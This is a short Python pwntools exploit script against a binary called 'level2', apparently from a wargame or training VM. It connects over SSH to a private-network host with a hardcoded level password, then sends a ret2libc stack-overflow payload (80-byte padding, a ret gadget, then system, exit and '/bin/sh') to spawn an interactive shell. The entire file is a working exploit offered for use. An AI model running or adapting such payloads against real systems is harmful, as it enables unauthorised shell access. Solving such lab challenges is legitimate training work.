# !/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from pwn import *

if args.DEBUG:
    context.log_level = 'debug'

PROG = './level2'

USER = 'level2'
HOST = '192.168.184.128'
PASSWD = '53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77'

elf = context.binary = ELF(PROG)
libc = ELF('./libc-2.15.so')

def u(str):
    return unpack(str, 8*len(str));
pack = make_packer('all')

# gs = '''
# continue
# '''
gs = ''

def start():
    if args.SSH:
        if USER is None or HOST is None or PASSWD is None:
            log.critical('Credentials are unset')
            exit(1)
        sshConnection = ssh(user=USER, host=HOST, port=4242, password=PASSWD)
        return sshConnection.process(PROG)
    if args.GDB:
        context.terminal = ['wt.exe', '-w', '0', 'sp', 'wsl.exe', '-d', 'kali-linux', '--']
        return gdb.debug(PROG, gdbscript=gs)
    return process(PROG)

p = start()
p.timeout = 5

libc.address = 0xb7e2c000 # Doesn't change because ASLR disabled on host
p_ret = 0x0804853e
payload = b"A"*80 + p32(p_ret) + p32(libc.sym.system) + p32(libc.sym.exit) + p32(next(libc.search(b'/bin/sh\x00')))

p.sendline(payload)

p.interactive()
